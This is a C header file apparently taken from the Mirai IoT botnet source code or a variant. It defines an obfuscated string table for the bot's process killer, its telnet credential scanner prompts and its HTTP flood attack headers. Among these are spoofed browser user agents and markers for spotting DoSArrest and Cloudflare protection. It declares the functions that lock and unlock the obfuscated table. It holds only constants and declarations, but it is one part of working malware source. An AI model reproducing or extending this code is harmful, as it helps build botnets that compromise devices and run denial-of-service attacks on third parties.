#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_EXEC_SUCCESS 1
#define TABLE_KILLER_PROC 2
#define TABLE_KILLER_EXE 3 
#define TABLE_KILLER_FD 4
#define TABLE_KILLER_MAPS 5
#define TABLE_KILLER_TCP 6
#define TABLE_MAPS_MIRAI 7
#define TABLE_ATK_RESOLVER 8
#define TABLE_ATK_NSERV 9
#define TABLE_MISC_WATCHDOG 10
#define TABLE_MISC_WATCHDOG2 11
#define TABLE_MISC_WATCHDOG3 12
#define TABLE_MISC_WATCHDOG4 13
#define TABLE_MISC_RANDOM 14
#define TABLE_INSTANCE_EXISTS 15
#define TABLE_SCAN_SHELL 16
#define TABLE_SCAN_ENABLE 17
#define TABLE_SCAN_SYSTEM 18
#define TABLE_SCAN_SH 19
#define TABLE_SCAN_QUERY 20
#define TABLE_SCAN_RESP 21
#define TABLE_SCAN_NCORRECT 22
#define TABLE_SCAN_ASSWORD 23
#define TABLE_SCAN_OGIN 24
#define TABLE_SCAN_ENTER 25

#define TABLE_HTTP_ONE                  26  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_TWO                  27  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_THREE                28  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_FOUR                 29  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_FIVE                 30  /* "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" */
#define TABLE_ATK_KEEP_ALIVE            31  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                32  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            33  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          34  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_SET_COOKIE            35  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           36  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          37  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        38  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    39  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 40  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               41  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        42  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        43  // "connection:"
#define TABLE_ATK_DOSARREST             44  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      45  // "server: cloudflare-nginx"
#define TABLE_ATK_HTTP					46  // "HTTP/1.1"
#define TABLE_ATK_USERAGENT 			47  // "User-Agent:"
#define TABLE_ATK_HOST					48  // "Host:"
#define TABLE_ATK_COOKIE				49  // "Cookie:"
#define TABLE_ATK_SEARCHHTTP			50  // "http"
#define TABLE_ATK_URL                   51  // "url="
#define TABLE_ATK_POST					52  // "POST"
#define TABLE_SCAN_CB_PORT              53
#define TABLE_MAX_KEYS 54

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
